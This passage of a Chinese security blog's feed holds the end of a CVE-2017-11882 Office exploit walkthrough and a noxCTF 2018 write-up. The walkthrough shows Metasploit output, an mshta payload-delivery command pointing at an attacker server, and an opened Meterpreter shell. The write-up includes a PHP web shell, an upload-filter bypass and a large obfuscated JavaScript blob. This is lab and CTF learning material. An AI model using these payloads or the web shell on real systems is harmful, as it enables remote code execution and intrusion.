http://192.168.1.5:8080/abc</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE in an MS document:</span><br><span class="line">mshta.exe &quot;http://192.168.1.5:8080/abc&quot;</span><br><span class="line">[*] 192.168.1.7      cve-2017-11882 - Delivering payload</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.7</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.7:58478) at 2018-09-18 13:16:55 +0800</span><br></pre></td></tr></table></figure></p><p>win7用360极速浏览器打开<code>http://192.168.1.5:8080/abc</code></p><p><img src="https://i.loli.net/2018/09/18/5ba08b7ad6eba.jpg" alt=""></p><p><img src="https://i.loli.net/2018/09/18/5ba08b7aa16a8.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; sessions -i 1 </span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1440 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\threst\AppData\Local\360Chrome\Chrome\Application\9.5.0.138&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">threst-pc\threst</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/i-honey/p/7885573.html" target="_blank" rel="noopener">https://www.cnblogs.com/i-honey/p/7885573.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;&gt;&lt;/a&gt;0x00 漏洞简介&lt;/h2&gt;&lt;p&gt;2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄
      
    
    </summary>
    
    
      <category term="CVE-2017-11882" scheme="https://threst.github.io/tags/CVE-2017-11882/"/>
    
  </entry>
  
  <entry>
    <title>noxctf2018wp</title>
    <link href="https://threst.github.io/2018/09/15/noxctf2018wp/"/>
    <id>https://threst.github.io/2018/09/15/noxctf2018wp/</id>
    <published>2018-09-15T05:34:14.000Z</published>
    <updated>2018-09-18T05:44:34.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>题目</p><blockquote><p>What is your reference again?<br><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p></blockquote><p>提示我改这个<code>Referer</code></p><p><img src="https://i.loli.net/2018/09/09/5b951e2db1219.png" alt=""></p><p>我就用Firefox的改包重发改成<code>/check_from_google</code></p><p><img src="https://i.loli.net/2018/09/09/5b951e2dca83d.png" alt=""></p><p><code>bm94Q1RGe0cwb2dMM18xc180bFc0WXNfVXJfYjNTVF9SM2YzcjNuYzN9</code></p><p>base64解密下</p><p>flag:<code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p><h2 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h2><p>题目</p><blockquote><p>This is my new file uploader server. I bet you can’t hack it!<br><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p></blockquote><p>打开链接，可以上传文件，随便写个文件试试。<br><code>shell.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system($_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/10/5b9602239f358.png" alt=""></p><p>提示失败，要图片类型才可以，经过几次尝试之后，把<code>shell.php</code>改成<code>shell.png.txt</code>上传试试，</p><p><img src="https://i.loli.net/2018/09/10/5b9602a635b95.png" alt=""></p><p>居然可以！访问下，但是没有解析，看看<code>uploads</code>有些什么，发现一个<code>Don&#39;t open</code>文件夹，他说不打开就不打开吗？可以要打开看看。</p><p><img src="https://i.loli.net/2018/09/10/5b9604668b06d.png" alt=""></p><p><img src="https://i.loli.net/2018/09/10/5b96046667e77.png" alt=""></p><p><code>AddType application/x-httpd-php .cyb3r</code>看样子只有<code>.cyb3r</code>才可以解析，把文件改成这个试试。</p><p><img src="https://i.loli.net/2018/09/10/5b96084b08caf.png" alt=""></p><p>成功了！这个文件很奇怪打开看看</p><p><code>curl &quot;http://chal.noxale.com:8079/uploads/shell.png.cyb3r?cmd=ls%207H3-FL4G-1S-H3r3&quot;</code></p><p><img src="https://i.loli.net/2018/09/10/5b9608dfb47f9.png" alt=""></p><p>flag:<code>noxCTF{N3V3R_7RU57_07H3R5}</code></p><h2 id="Read-Between-The-Lines"><a href="#Read-Between-The-Lines" class="headerlink" title="Read Between The Lines"></a>Read Between The Lines</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">My boss promised me that he would give me a raise if I solve his challenge.</span><br><span class="line">Have I already mentioned I suck in challenges?</span><br></pre></td></tr></table></figure></p><p>下载下来一个<code>message.code</code>,linux下打不开，不急，file试一下，提示<code>gzip</code>，把他后缀名改成<code>gz</code>就可以打开了。<br>打开后是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((